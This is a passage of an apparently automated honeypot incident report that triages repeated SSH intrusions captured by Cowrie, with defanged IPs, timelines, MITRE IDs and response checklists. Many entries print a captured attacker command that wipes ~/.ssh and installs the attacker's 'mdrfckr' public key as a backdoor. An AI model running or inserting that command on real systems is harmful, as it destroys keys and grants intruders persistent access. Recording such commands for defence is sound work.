| `2026-06-13 08:06:16` | `cowrie.client.version` |
| `2026-06-13 08:06:17` | `cowrie.client.kex` |
| `2026-06-13 08:06:17` | `cowrie.login.success` |
| `2026-06-13 08:06:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.83.13[.]181` to AbuseIPDB if not already reported
- [ ] Block `154.83.13[.]181` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3409d2664e43

| Field | Detail |
|---|---|
| **Source IP** | `206.189.130[.]156` |
| **First Seen** | 2026-06-13 08:08 |
| **Last Seen** | 2026-06-13 08:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 08:08:25` | `cowrie.session.connect` |
| `2026-06-13 08:08:25` | `cowrie.client.version` |
| `2026-06-13 08:08:25` | `cowrie.client.kex` |
| `2026-06-13 08:08:25` | `cowrie.login.success` |
| `2026-06-13 08:08:25` | `cowrie.session.params` |
| `2026-06-13 08:08:25` | `cowrie.command.input` |
| `2026-06-13 08:08:25` | `cowrie.command.failed` |
| `2026-06-13 08:08:25` | `cowrie.log.closed` |
| `2026-06-13 08:08:25` | `cowrie.session.params` |
| `2026-06-13 08:08:25` | `cowrie.command.input` |
| `2026-06-13 08:08:25` | `cowrie.session.file_download` |
| `2026-06-13 08:08:25` | `cowrie.log.closed` |
| `2026-06-13 08:08:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `206.189.130[.]156` to AbuseIPDB if not already reported
- [ ] Block `206.189.130[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65c210d33cc5

| Field | Detail |
|---|---|
| **Source IP** | `206.189.130[.]156` |
| **First Seen** | 2026-06-13 08:08 |
| **Last Seen** | 2026-06-13 08:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 08:08:27` | `cowrie.session.connect` |
| `2026-06-13 08:08:27` | `cowrie.client.version` |
| `2026-06-13 08:08:27` | `cowrie.client.kex` |
| `2026-06-13 08:08:27` | `cowrie.login.success` |
| `2026-06-13 08:08:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `206.189.130[.]156` to AbuseIPDB if not already reported
- [ ] Block `206.189.130[.]156` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a8f408a97a3

| Field | Detail |
|---|---|
| **Source IP** | `206.189.130[.]156` |
| **First Seen** | 2026-06-13 08:10 |
| **Last Seen** | 2026-06-13 08:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 08:10:26` | `cowrie.session.connect` |
| `2026-06-13 08:10:26` | `cowrie.client.version` |
| `2026-06-13 08:10:26` | `cowrie.client.kex` |
| `2026-06-13 08:10:26` | `cowrie.login.success` |
| `2026-06-13 08:10:26` | `cowrie.session.params` |
| `2026-06-13 08:10:26` | `cowrie.command.input` |
| `2026-06-13 08:10:26` | `cowrie.command.failed` |
| `2026-06-13 08:10:26` | `cowrie.log.closed` |
| `2026-06-13 08:10:26` | `cowrie.session.params` |
| `2026-06-13 08:10:26` | `cowrie.command.input` |
| `2026-06-13 08:10:26` | `cowrie.session.file_download` |
| `2026-06-13 08:10:26` | `cowrie.log.closed` |
| `2026-06-13 08:10:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `206.189.130[.]156` to AbuseIPDB if not already reported
- [ ] Block `206.189.130[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8c61497a9e8

| Field | Detail |
|---|---|
| **Source IP** | `206.189.130[.]156` |
| **First Seen** | 2026-06-13 08:10 |
| **Last Seen** | 2026-06-13 08:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 08:10:27` | `cowrie.session.connect` |
| `2026-06-13 08:10:27` | `cowrie.client.version` |
| `2026-06-13 08:10:27` | `cowrie.client.kex` |
| `2026-06-13 08:10:27` | `cowrie.login.success` |
| `2026-06-13 08:10:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `206.189.130[.]156` to AbuseIPDB if not already reported
- [ ] Block `206.189.130[.]156` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff831908e2e8

| Field | Detail |
|---|---|
| **Source IP** | `206.189.130[.]156` |
| **First Seen** | 2026-06-13 08:12 |
| **Last Seen** | 2026-06-13 08:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 08:12:28` | `cowrie.session.connect` |
| `2026-06-13 08:12:28` | `cowrie.client.version` |
| `2026-06-13 08:12:28` | `cowrie.client.kex` |
| `2026-06-13 08:12:28` | `cowrie.login.success` |
| `2026-06-13 08:12:28` | `cowrie.session.params` |
| `2026-06-13 08:12:28` | `cowrie.command.input` |
| `2026-06-13 08:12:28` | `cowrie.command.failed` |
| `2026-06-13 08:12:28` | `cowrie.log.closed` |
| `2026-06-13 08:12:28` | `cowrie.session.params` |
| `2026-06-13 08:12:28` | `cowrie.command.input` |
| `2026-06-13 08:12:28` | `cowrie.session.file_download` |
| `2026-06-13 08:12:28` | `cowrie.log.closed` |
| `2026-06-13 08:12:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `206.189.130[.]156` to AbuseIPDB if not already reported
- [ ] Block `206.189.130[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c20ac8803720

| Field | Detail |
|---|---|
| **Source IP** | `206.189.130[.]156` |
| **First Seen** | 2026-06-13 08:12 |
| **Last Seen** | 2026-06-13 08:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 08:12:29` | `cowrie.session.connect` |
| `2026-06-13 08:12:29` | `cowrie.client.version` |
| `2026-06-13 08:12:29` | `cowrie.client.kex` |
| `2026-06-13 08:12:29` | `cowrie.login.success` |
| `2026-06-13 08:12:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `206.189.130[.]156` to AbuseIPDB if not already reported
- [ ] Block `206.189.130[.]156` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5dadeb58f520

| Field | Detail |
|---|---|
| **Source IP** | `206.189.130[.]156` |
| **First Seen** | 2026-06-13 08:18 |
| **Last Seen** | 2026-06-13 08:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 08:18:11` | `cowrie.session.connect` |
| `2026-06-13 08:18:11` | `cowrie.client.version` |
| `2026-06-13 08:18:11` | `cowrie.client.kex` |
| `2026-06-13 08:18:12` | `cowrie.login.success` |
| `2026-06-13 08:18:12` | `cowrie.session.params` |
| `2026-06-13 08:18:12` | `cowrie.command.input` |
| `2026-06-13 08:18:12` | `cowrie.command.failed` |
| `2026-06-13 08:18:12` | `cowrie.log.closed` |
| `2026-06-13 08:18:12` | `cowrie.session.params` |
| `2026-06-13 08:18:12` | `cowrie.command.input` |
| `2026-06-13 08:18:12` | `cowrie.session.file_download` |
| `2026-06-13 08:18:12` | `cowrie.log.closed` |
| `2026-06-13 08:18:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `206.189.130[.]156` to AbuseIPDB if not already reported
- [ ] Block `206.189.130[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31bb8cfd21cf

| Field | Detail |
|---|---|
| **Source IP** | `206.189.130[.]156` |
| **First Seen** | 2026-06-13 08:18 |
| **Last Seen** | 2026-06-13 08:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 08:18:13` | `cowrie.session.connect` |
| `2026-06-13 08:18:13` | `cowrie.client.version` |
| `2026-06-13 08:18:13` | `cowrie.client.kex` |
| `2026-06-13 08:18:13` | `cowrie.login.success` |
| `2026-06-13 08:18:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `206.189.130[.]156` to AbuseIPDB if not already reported
- [ ] Block `206.189.130[.]156` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2496433e004e

| Field | Detail |
|---|---|
| **Source IP** | `206.189.130[.]156` |
| **First Seen** | 2026-06-13 08:23 |
| **Last Seen** | 2026-06-13 08:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 08:23:54` | `cowrie.session.connect` |
| `2026-06-13 08:23:54` | `cowrie.client.version` |
| `2026-06-13 08:23:54` | `cowrie.client.kex` |
| `2026-06-13 08:23:54` | `cowrie.login.success` |
| `2026-06-13 08:23:54` | `cowrie.session.params` |
| `2026-06-13 08:23:54` | `cowrie.command.input` |
| `2026-06-13 08:23:54` | `cowrie.command.failed` |
| `2026-06-13 08:23:54` | `cowrie.log.closed` |
| `2026-06-13 08:23:55` | `cowrie.session.params` |
| `2026-06-13 08:23:55` | `cowrie.command.input` |
| `2026-06-13 08:23:55` | `cowrie.session.file_download` |
| `2026-06-13 08:23:55` | `cowrie.log.closed` |
| `2026-06-13 08:23:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `206.189.130[.]156` to AbuseIPDB if not already reported
- [ ] Block `206.189.130[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-667f66749ade

| Field | Detail |
|---|---|
| **Source IP** | `206.189.130[.]156` |
| **First Seen** | 2026-06-13 08:23 |
| **Last Seen** | 2026-06-13 08:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 08:23:56` | `cowrie.session.connect` |
| `2026-06-13 08:23:56` | `cowrie.client.version` |
| `2026-06-13 08:23:56` | `cowrie.client.kex` |
| `2026-06-13 08:23:56` | `cowrie.login.success` |
| `2026-06-13 08:23:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `206.189.130[.]156` to AbuseIPDB if not already reported
- [ ] Block `206.189.130[.]156` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8cdca51be75b

| Field | Detail |
|---|---|
| **Source IP** | `43.128.70[.]79` |
| **First Seen** | 2026-06-13 08:24 |
| **Last Seen** | 2026-06-13 08:24 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 08:24:27` | `cowrie.session.connect` |
| `2026-06-13 08:24:27` | `cowrie.client.version` |
| `2026-06-13 08:24:27` | `cowrie.client.kex` |
| `2026-06-13 08:24:27` | `cowrie.login.success` |
| `2026-06-13 08:24:28` | `cowrie.session.params` |
| `2026-06-13 08:24:28` | `cowrie.command.input` |
| `2026-06-13 08:24:28` | `cowrie.command.failed` |
| `2026-06-13 08:24:28` | `cowrie.log.closed` |
| `2026-06-13 08:24:28` | `cowrie.session.params` |
| `2026-06-13 08:24:28` | `cowrie.command.input` |
| `2026-06-13 08:24:28` | `cowrie.session.file_download` |
| `2026-06-13 08:24:28` | `cowrie.log.closed` |
| `2026-06-13 08:24:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.128.70[.]79` to AbuseIPDB if not already reported
- [ ] Block `43.128.70[.]79` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ffdce189023c

| Field | Detail |
|---|---|
| **Source IP** | `43.128.70[.]79` |
| **First Seen** | 2026-06-13 08:24 |
| **Last Seen** | 2026-06-13 08:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 08:24:29` | `cowrie.session.connect` |
| `2026-06-13 08:24:29` | `cowrie.client.version` |
| `2026-06-13 08:24:29` | `cowrie.client.kex` |
| `2026-06-13 08:24:30` | `cowrie.login.success` |
| `2026-06-13 08:24:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.128.70[.]79` to AbuseIPDB if not already reported
- [ ] Block `43.128.70[.]79` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4368e13c150

| Field | Detail |
|---|---|
| **Source IP** | `206.189.130[.]156` |
| **First Seen** | 2026-06-13 08:25 |
| **Last Seen** | 2026-06-13 08:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 08:25:54` | `cowrie.session.connect` |
| `2026-06-13 08:25:54` | `cowrie.client.version` |
| `2026-06-13 08:25:54` | `cowrie.client.kex` |
| `2026-06-13 08:25:55` | `cowrie.login.success` |
| `2026-06-13 08:25:55` | `cowrie.session.params` |
| `2026-06-13 08:25:55` | `cowrie.command.input` |
| `2026-06-13 08:25:55` | `cowrie.command.failed` |
| `2026-06-13 08:25:55` | `cowrie.log.closed` |
| `2026-06-13 08:25:55` | `cowrie.session.params` |
| `2026-06-13 08:25:55` | `cowrie.command.input` |
| `2026-06-13 08:25:55` | `cowrie.session.file_download` |
| `2026-06-13 08:25:55` | `cowrie.log.closed` |
| `2026-06-13 08:25:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `206.189.130[.]156` to AbuseIPDB if not already reported
- [ ] Block `206.189.130[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3cae70fdbf49

| Field | Detail |
|---|---|
| **Source IP** | `206.189.130[.]156` |
| **First Seen** | 2026-06-13 08:25 |
| **Last Seen** | 2026-06-13 08:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 08:25:56` | `cowrie.session.connect` |
| `2026-06-13 08:25:56` | `cowrie.client.version` |
| `2026-06-13 08:25:56` | `cowrie.client.kex` |
| `2026-06-13 08:25:56` | `cowrie.login.success` |
| `2026-06-13 08:25:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `206.189.130[.]156` to AbuseIPDB if not already reported
- [ ] Block `206.189.130[.]156` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2165526404a6

| Field | Detail |
|---|---|
| **Source IP** | `68.233.116[.]124` |
| **First Seen** | 2026-06-13 08:32 |
| **Last Seen** | 2026-06-13 08:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 08:32:43` | `cowrie.session.connect` |
| `2026-06-13 08:32:43` | `cowrie.client.version` |
| `2026-06-13 08:32:43` | `cowrie.client.kex` |
| `2026-06-13 08:32:43` | `cowrie.login.success` |
| `2026-06-13 08:32:43` | `cowrie.session.params` |
| `2026-06-13 08:32:43` | `cowrie.command.input` |
| `2026-06-13 08:32:43` | `cowrie.command.failed` |
| `2026-06-13 08:32:43` | `cowrie.log.closed` |
| `2026-06-13 08:32:43` | `cowrie.session.params` |
| `2026-06-13 08:32:43` | `cowrie.command.input` |
| `2026-06-13 08:32:43` | `cowrie.session.file_download` |
| `2026-06-13 08:32:43` | `cowrie.log.closed` |
| `2026-06-13 08:32:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `68.233.116[.]124` to AbuseIPDB if not already reported
- [ ] Block `68.233.116[.]124` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-deece42c9ef2

| Field | Detail |
|---|---|
| **Source IP** | `68.233.116[.]124` |
| **First Seen** | 2026-06-13 08:32 |
| **Last Seen** | 2026-06-13 08:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 08:32:44` | `cowrie.session.connect` |
| `2026-06-13 08:32:44` | `cowrie.client.version` |
| `2026-06-13 08:32:44` | `cowrie.client.kex` |
| `2026-06-13 08:32:44` | `cowrie.login.success` |
| `2026-06-13 08:32:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `68.233.116[.]124` to AbuseIPDB if not already reported
- [ ] Block `68.233.116[.]124` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c0bb615f7d7

| Field | Detail |
|---|---|
| **Source IP** | `206.189.130[.]156` |
| **First Seen** | 2026-06-13 08:33 |
| **Last Seen** | 2026-06-13 08:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
